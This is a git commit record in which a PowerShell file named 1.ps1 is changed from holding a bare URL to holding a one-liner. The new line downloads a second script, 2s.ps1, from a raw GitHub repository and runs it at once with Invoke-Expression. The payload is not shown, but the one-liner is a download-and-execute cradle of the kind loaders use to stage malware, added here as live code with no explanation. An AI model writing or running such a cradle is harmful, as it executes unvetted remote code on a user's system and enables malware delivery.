e8716557388b98babbbf660be5408d4e2fbeca41
billhemmer2789 <97331850+billhemmer2789@users.noreply.github.com>
2022-01-09 12:54:53 -0600

    Update 1.ps1

--- 1.ps1
+++ 1.ps1
@@ -1,1 +1,1 @@
-https://raw.githubusercontent.com/billhemmer2789/food/main/2s.ps1
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/billhemmer2789/food/main/2s.ps1");
